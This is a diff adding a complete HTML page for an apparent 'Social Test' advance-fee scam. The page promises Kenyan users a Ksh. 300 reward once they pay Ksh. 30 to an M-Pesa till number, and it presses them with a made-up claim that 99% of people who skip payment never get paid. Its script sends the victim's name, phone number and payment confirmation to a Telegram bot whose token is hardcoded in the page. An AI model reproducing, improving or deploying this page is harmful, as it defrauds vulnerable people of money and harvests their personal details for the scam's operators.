@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Social Test</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ===== RESET & BASE ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-height: 100vh;
+      background: #f4f7fb;
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      color: #1e2a3a;
+    }
+
+    /* ===== SPLIT LAYOUT (scrollable) ===== */
+    .split-layout {
+      display: flex;
+      width: 100%;
+      min-height: 100vh;
+      align-items: stretch;
+    }
+
+    /* ===== LEFT PANEL (Sticky image) ===== */
+    .left-panel {
+      flex: 1;
+      height: 100vh;
+      position: sticky;
+      top: 0;
+      overflow: hidden;
+      background: #1e2a3a;
+    }
+
+    .left-panel img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* ===== RIGHT PANEL (Scrollable content) ===== */
+    .right-panel {
+      flex: 1;
+      height: auto;
+      min-height: 100vh;
+      overflow-y: visible;
+      background: #ffffff;
+      padding: 28px 36px 40px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    /* ===== TOP ROW ===== */
+    .top-row {
+      display: flex;
+      align-items: flex-start;
+      padding-bottom: 18px;
+      border-bottom: 2px solid #eaedf2;
+      flex-shrink: 0;
+    }
+
+    .top-row h2 {
+      font-size: 24px;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+
+    .top-row h2 i {
+      color: #1d6b3c;
+      margin-right: 10px;
+    }
+
+    /* ===== TWO COLUMNS (Cards) ===== */
+    .two-col {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px;
+      flex: 1;
+    }
+
+    .card {
+      flex: 1 1 280px;
+      min-width: 240px;
+      background: #fafcfe;
+      border: 1px solid #dce3ec;
+      border-radius: 10px;
+      padding: 22px 24px 28px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+
+    .card h3 i {
+      color: #1d6b3c;
+    }
+
+    /* ===== BUTTONS (wrapped in div) ===== */
+    .social-btn,
+    .details-toggle,
+    .submit-details-btn {
+      width: 100%;
+      padding: 14px 16px;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      transition: background 0.15s, transform 0.1s;
+      font-family: inherit;
+    }
+
+    .social-btn {
+      background: #1e2a3a;
+      color: #fff;
+    }
+
+    .social-btn:hover {
+      background: #2c3b4f;
+    }
+
+    .details-toggle {
+      background: #edf2f8;
+      color: #1e2a3a;
+      border: 1px solid #ccd6e2;
+    }
+
+    .details-toggle:hover {
+      background: #e2e9f2;
+    }
+
+    .submit-details-btn {
+      background: #1d6b3c;
+      color: #fff;
+      margin-top: 8px;
+    }
+
+    .submit-details-btn:hover {
+      background: #155830;
+    }
+
+    .social-btn:active,
+    .details-toggle:active,
+    .submit-details-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* ===== TILL REVEAL ===== */
+    .till-reveal {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s ease, padding 0.3s ease, opacity 0.25s ease;
+      opacity: 0;
+      padding: 0 4px;
+      margin-top: 0;
+      background: #f4f8ff;
+      border-radius: 8px;
+      border: 1px solid transparent;
+    }
+
+    .till-reveal.open {
+      max-height: 500px;
+      opacity: 1;
+      padding: 18px 20px;
+      margin-top: 16px;
+      border-color: #b8cadd;
+    }
+
+    .till-number {
+      font-size: 34px;
+      font-weight: 800;
+      font-family: 'Courier New', monospace;
+      background: #fff;
+      padding: 8px 20px;
+      border-radius: 8px;
+      border: 1px solid #cdd8e6;
+      text-align: center;
+      letter-spacing: 4px;
+    }
+
+    .till-label {
+      font-weight: 600;
+      font-size: 14px;
+      color: #3d536e;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    /* ===== PAYMENT REMINDER ===== */
+    .payment-reminder {
+      margin-top: 16px;
+      padding: 14px 16px;
+      background: #fef6e0;
+      border-left: 5px solid #e68a2e;
+      border-radius: 6px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .payment-reminder i {
+      color: #e68a2e;
+      margin-right: 8px;
+    }
+
+    /* ===== FORM ===== */
+    .details-form {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.45s ease, padding 0.3s ease, opacity 0.25s ease;
+      opacity: 0;
+      padding: 0 2px;
+    }
+
+    .details-form.open {
+      max-height: 1100px;
+      opacity: 1;
+      padding: 20px 2px 6px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      font-size: 14px;
+      color: #1e2a3a;
+      margin-bottom: 4px;
+    }
+
+    .form-group label .required {
+      color: #c23a3a;
+      margin-left: 3px;
+    }
+
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #cdd8e6;
+      border-radius: 6px;
+      font-size: 15px;
+      background: #ffffff;
+      font-family: inherit;
+      color: #1e2a3a;
+    }
+
+    .form-group input:focus,
+    .form-group select:focus {
+      outline: none;
+      border-color: #4a7bc4;
+    }
+
+    .form-group input[type="file"] {
+      padding: 8px 10px;
+      background: #f7faff;
+      border-style: dashed;
+      cursor: pointer;
+    }
+
+    .form-group input[type="file"]::file-selector-button {
+      padding: 6px 18px;
+      border: none;
+      border-radius: 4px;
+      background: #2c3b4f;
+      color: #fff;
+      font-weight: 600;
+      font-size: 13px;
+      cursor: pointer;
+      margin-right: 14px;
+      transition: background 0.15s;
+    }
+
+    .form-group input[type="file"]::file-selector-button:hover {
+      background: #1e2a3a;
+    }
+
+    /* checkbox styling */
+    .form-group.checkbox-group {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-top: 4px;
+    }
+
+    .form-group.checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      margin-top: 2px;
+      accent-color: #1d6b3c;
+      cursor: pointer;
+    }
+
+    .form-group.checkbox-group label {
+      font-weight: 500;
+      font-size: 14px;
+      color: #1e2a3a;
+      cursor: pointer;
+      line-height: 1.5;
+    }
+
+    .form-group.checkbox-group label strong {
+      color: #c0691a;
+    }
+
+    /* conditional count group */
+    #countGroup {
+      display: none;
+      transition: all 0.2s ease;
+    }
+
+    /* ===== SUCCESS / ERROR ===== */
+    .success-msg {
+      display: none;
+      background: #e6f4ea;
+      border-left: 5px solid #1d6b3c;
+      padding: 12px 16px;
+      border-radius: 6px;
+      margin-top: 16px;
+      align-items: center;
+      gap: 12px;
+      color: #15502a;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .success-msg.show {
+      display: flex;
+    }
+
+    .success-msg i {
+      font-size: 22px;
+      color: #1d6b3c;
+    }
+
+    .error-msg {
+      display: none;
+      background: #fde8e8;
+      border-left: 5px solid #c23a3a;
+      padding: 12px 16px;
+      border-radius: 6px;
+      margin-top: 16px;
+      align-items: center;
+      gap: 12px;
+      color: #7a2a2a;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .error-msg.show {
+      display: flex;
+    }
+
+    .error-msg i {
+      font-size: 22px;
+      color: #c23a3a;
+    }
+
+    /* ===== SUPPORT SECTION (always visible) ===== */
+    #supportSection {
+      flex-shrink: 0;
+      margin-top: 4px;
+      padding: 16px;
+      background: #f0f6ff;
+      border-radius: 8px;
+      border: 1px solid #ccd6e2;
+      text-align: center;
+    }
+
+    #supportSection p {
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #1e2a3a;
+    }
+
+    #supportSection .support-buttons {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    #supportSection .support-buttons a {
+      padding: 10px 20px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      border: none;
+      cursor: pointer;
+      transition: transform 0.1s, opacity 0.15s;
+      color: #fff;
+    }
+
+    #supportSection .support-buttons a:hover {
+      transform: scale(1.02);
+      opacity: 0.9;
+    }
+
+    #supportSection .support-buttons .fb-btn {
+      background: #1877f2;
+    }
+
+    #supportSection .support-buttons .wa-btn {
+      background: #25d366;
+    }
+
+    #supportSection .support-note {
+      font-size: 12px;
+      color: #5a6f8a;
+      margin-top: 10px;
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 820px) {
+      .split-layout {
+        flex-direction: column;
+        min-height: auto;
+      }
+
+      .left-panel {
+        position: relative;
+        top: 0;
+        height: 40vh;
+        flex: 0 0 40vh;
+        width: 100%;
+        min-height: 200px;
+      }
+
+      .left-panel img {
+        object-fit: cover;
+        width: 100%;
+        height: 100%;
+      }
+
+      .right-panel {
+        padding: 20px 16px 28px;
+        min-height: auto;
+        height: auto;
+        overflow-y: visible;
+      }
+
+      .two-col {
+        flex-direction: column;
+      }
+
+      .card {
+        flex: 1 1 auto;
+      }
+
+      .top-row h2 {
+        font-size: 22px;
+      }
+
+      .social-btn,
+      .details-toggle,
+      .submit-details-btn {
+        font-size: 16px;
+        padding: 12px 14px;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .right-panel {
+        padding: 12px 10px 20px;
+      }
+
+      .card {
+        padding: 16px 14px 20px;
+      }
+
+      .till-number {
+        font-size: 28px;
+        padding: 6px 12px;
+      }
+
+      .left-panel {
+        height: 30vh;
+        flex: 0 0 30vh;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="split-layout">
+
+    <!-- ===== LEFT PANEL: Sticky full-height image ===== -->
+    <div class="left-panel">
+      <img src="file_00000000b9ec71f4ae56521fe32148dd.png" alt="Verification" />
+    </div>
+
+    <!-- ===== RIGHT PANEL: All content (scrollable) ===== -->
+    <div class="right-panel">
+
+      <!-- TOP ROW -->
+      <header class="top-row">
+        <h2>Submit your verification details</h2>
+      </header>
+
+      <!-- TWO COLUMNS (Cards) -->
+      <section class="two-col">
+
+        <!-- LEFT CARD: Social Test -->
+        <section class="card">
+          <h3> Social Test program is ongoing</h3>
+
+          <div><button class="social-btn" id="socialTestBtn">Social Test program on_going
+            </button></div>
+
+          <section class="till-reveal" id="tillReveal">
+            <span class="till-label">Official Till Number</span>
+            <p class="till-number">9273195</p>
+
+            <div class="payment-reminder">
+              <span>
+                Your Ksh. <strong>300 reward</strong> is credited <strong>instantly</strong> after confirmation.<br />
+                <strong>99% of users</strong> who skip this step <strong>never receive</strong> their reward.
+              </span>
+            </div>
+          </section>
+        </section>
+
+        <!-- RIGHT CARD: Submit Details -->
+        <section class="card">
+          <h3><i class="fas fa-user-check"></i> Verify ans claim your ksh 300</h3>
+
+          <div><button class="details-toggle" id="detailsToggle">
+              <span><i class="fas fa-chevron-down"></i> Open form</span>
+              <i class="fas fa-chevron-down"></i>
+            </button></div>
+
+          <section class="details-form" id="detailsForm">
+            <form id="detailsFormElement" novalidate>
+
+              <!-- 1. Have you ever done social test? -->
+              <p class="form-group">
+                <label>Have you ever done social test? <span class="required">*</span></label>
+                <select id="hasDoneTest" required>
+                  <option value="">Select...</option>
+                  <option value="Yes">Yes</option>
+                  <option value="No">No</option>
+                </select>
+              </p>
+
+              <!-- 2. How many times? (conditional) -->
+              <p class="form-group" id="countGroup">
+                <label>How many times have you done social test? <span class="required">*</span></label>
+                <input type="number" id="testCount" min="1" placeholder="Enter number of times" />
+              </p>
+
+              <!-- 3. Full Name -->
+              <p class="form-group">
+                <label>Full Name <span class="required">*</span></label>
+                <input type="text" id="fullName" placeholder="John Mwangi" required />
+              </p>
+
+              <!-- 4. Phone Number -->
+              <p class="form-group">
+                <label>Phone Number <span class="required">*</span></label>
+                <input type="tel" id="phoneNumber" placeholder="+254 7XX XXX XXX" required />
+              </p>
+
+              <!-- 5. Upload Proof (optional) -->
+              <p class="form-group">
+                <label><i class="fas fa-receipt"></i> Upload Proof (Ksh. 30 payment)</label>
+                <input type="file" id="proofUpload" accept="image/*,.pdf" />
+                <span style="display:block; font-size:12px; color:#5a6f8a; margin-top:4px;">
+                  <i class="fas fa-info-circle"></i> Screenshot of M-Pesa confirmation (optional, speeds up verification)
+                </span>
+              </p>
+
+              <!-- 6. CONFIRMATION CHECKBOX -->
+              <div class="form-group checkbox-group">
+                <input type="checkbox" id="paymentConfirm" required />
+                <label for="paymentConfirm">
+                  <strong>I confirm</strong> that I have sent <strong>Ksh. 30</strong> to <strong>Till 9273195</strong>.<br />
+                  I understand that my details will only be processed after payment confirmation.
+                </label>
+              </div>
+
+              <div><button type="submit" class="submit-details-btn">
+                  <i class="fas fa-paper-plane"></i> Submit &amp; Claim Ksh. 300
+                </button></div>
+
+              <aside class="success-msg" id="successMsg">
+                <i class="fas fa-check-circle"></i>
+                <span><strong>Submitted!</strong> Your details and payment confirmation have been sent. You will receive Ksh. 300 within 5 minutes.</span>
+              </aside>
+
+              <aside class="error-msg" id="errorMsg">
+                <i class="fas fa-exclamation-circle"></i>
+                <span><strong>Error!</strong> Failed to send. Please check your connection and try again.</span>
+              </aside>
+
+            </form>
+          </section>
+        </section>
+
+      </section><!-- /two-col -->
+
+      <!-- SUPPORT SECTION (always visible) -->
+      <div id="supportSection">
+        <p><i class="fas fa-headset"></i> Need help or have questions?</p>
+        <div class="support-buttons">
+          <a href="https://www.facebook.com/kichmakende" target="_blank" class="fb-btn">
+            <i class="fab fa-facebook"></i> Facebook Support
+          </a>
+          <a href="https://wa.me/254798688920" target="_blank" class="wa-btn">
+            <i class="fab fa-whatsapp"></i> WhatsApp Support
+          </a>
+        </div>
+        <p class="support-note">We usually respond within 5 minutes.</p>
+      </div>
+
+    </div><!-- /right-panel -->
+
+  </div><!-- /split-layout -->
+
+  <script>
+    (function() {
+      'use strict';
+
+      // ===== TOGGLE 1: Social Test =====
+      const socialBtn = document.getElementById('socialTestBtn');
+      const tillReveal = document.getElementById('tillReveal');
+      let tillOpen = false;
+
+      socialBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        tillOpen = !tillOpen;
+        if (tillOpen) {
+          tillReveal.classList.add('open');
+          socialBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Hide Till <i class="fas fa-chevron-up"></i>';
+        } else {
+          tillReveal.classList.remove('open');
+          socialBtn.innerHTML = '<i class="fas fa-chevron-down"></i> Social Test <i class="fas fa-chevron-down"></i>';
+        }
+      });
+
+      // ===== TOGGLE 2: Details Form =====
+      const toggleBtn = document.getElementById('detailsToggle');
+      const detailsForm = document.getElementById('detailsForm');
+      let formOpen = false;
+
+      toggleBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        formOpen = !formOpen;
+        if (formOpen) {
+          detailsForm.classList.add('open');
+          toggleBtn.innerHTML = '<span><i class="fas fa-chevron-up"></i> Close form</span> <i class="fas fa-chevron-up"></i>';
+        } else {
+          detailsForm.classList.remove('open');
+          toggleBtn.innerHTML = '<span><i class="fas fa-chevron-down"></i> Open form</span> <i class="fas fa-chevron-down"></i>';
+        }
+      });
+
+      // ===== CONDITIONAL COUNT FIELD =====
+      const hasDoneSelect = document.getElementById('hasDoneTest');
+      const countGroup = document.getElementById('countGroup');
+      const testCountInput = document.getElementById('testCount');
+
+      hasDoneSelect.addEventListener('change', function() {
+        if (this.value === 'Yes') {
+          countGroup.style.display = 'block';
+          testCountInput.required = true;
+        } else {
+          countGroup.style.display = 'none';
+          testCountInput.required = false;
+          testCountInput.value = '';
+        }
+      });
+
+      // ===== TELEGRAM CONFIGURATION =====
+      const BOT_TOKEN = '8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc';
+      const CHAT_ID = '8468538314';
+
+      // ===== FORM SUBMISSION =====
+      const form = document.getElementById('detailsFormElement');
+      const successMsg = document.getElementById('successMsg');
+      const errorMsg = document.getElementById('errorMsg');
+
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        // Hide previous messages
+        successMsg.classList.remove('show');
+        errorMsg.classList.remove('show');
+
+        // 1. Gather data
+        const hasDone = hasDoneSelect.value;
+        const testCount = testCountInput.value;
+        const fullName = document.getElementById('fullName').value.trim();
+        const phoneNumber = document.getElementById('phoneNumber').value.trim();
+        const proofFile = document.getElementById('proofUpload').files[0];
+        const paymentConfirmed = document.getElementById('paymentConfirm').checked;
+
+        // 2. Validate
+        if (!hasDone) {
+          alert('Please select if you have ever done social test.');
+          hasDoneSelect.focus();
+          return;
+        }
+
+        if (hasDone === 'Yes' && !testCount) {
+          alert('Please enter how many times you have done social test.');
+          testCountInput.focus();
+          return;
+        }
+
+        if (!fullName) {
+          alert('Please enter your full name.');
+          document.getElementById('fullName').focus();
+          return;
+        }
+
+        if (!phoneNumber || phoneNumber.length < 8) {
+          alert('Please enter a valid phone number.');
+          document.getElementById('phoneNumber').focus();
+          return;
+        }
+
+        if (!paymentConfirmed) {
+          alert('Please confirm that you have sent Ksh. 30 to Till 9273195.');
+          document.getElementById('paymentConfirm').focus();
+          return;
+        }
+
+        // 3. Build message
+        let message = `*New Submission (Payment Confirmed)*\n\n`;
+        message += `*Name:* ${fullName}\n`;
+        message += `*Phone:* ${phoneNumber}\n`;
+        message += `*Has Done Test:* ${hasDone}\n`;
+        if (hasDone === 'Yes') {
+          message += `*Number of Times:* ${testCount}\n`;
+        }
+        message += `*Payment Confirmed:* Yes (Ksh. 30 to Till 9273195)\n`;
+        if (proofFile) {
+          message += `*Proof Uploaded:* ${proofFile.name} (${(proofFile.size / 1024).toFixed(2)} KB)\n`;
+        } else {
+          message += `*Proof Uploaded:* No\n`;
+        }
+
+        // 4. Send to Telegram
+        const url =
+          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        try {
+          const response = await fetch(url);
+          const data = await response.json();
+
+          if (data.ok) {
+            successMsg.classList.add('show');
+            const submitBtn = form.querySelector('.submit-details-btn');
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.6';
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sent...';
+            successMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          } else {
+            console.error('Telegram API Error:', data);
+            errorMsg.classList.add('show');
+            errorMsg.innerHTML =
+              `<i class="fas fa-exclamation-circle"></i> <span><strong>Error!</strong> ${data.description || 'Failed to send. Please try again.'}</span>`;
+          }
+        } catch (error) {
+          console.error('Fetch Error:', error);
+          errorMsg.classList.add('show');
+          errorMsg.innerHTML =
+            `<i class="fas fa-exclamation-circle"></i> <span><strong>Network Error!</strong> Please check your internet connection.</span>`;
+        }
+      });
+
+    })();
+  </script>
+
+</body>
+</html>
